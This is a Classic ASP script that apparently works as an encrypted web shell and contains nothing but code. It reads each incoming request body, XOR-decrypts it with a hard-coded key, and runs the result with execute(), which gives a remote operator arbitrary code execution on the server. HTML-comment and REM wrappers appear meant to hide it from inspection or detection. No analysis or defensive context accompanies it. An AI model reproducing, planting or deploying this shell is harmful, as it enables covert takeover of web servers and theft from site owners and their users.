<%
<!--
Response.CharSet = "UTF-8"
Bxf948="0bac0b57fdde5f76"
Session("k")=Bxf948
C490=Request.TotalBytes
QNGSU=Request.BinaryRead(C490)
For i=1 To C490
LB6XnR=ascb(midb(QNGSU,i,1)) Xor Asc(Mid(Bxf948,(i and 15)+1,1))
VSRBJ=VSRBJ&Chr(LB6XnR)
Next
execute(VSRBJ)REM )
-->
%>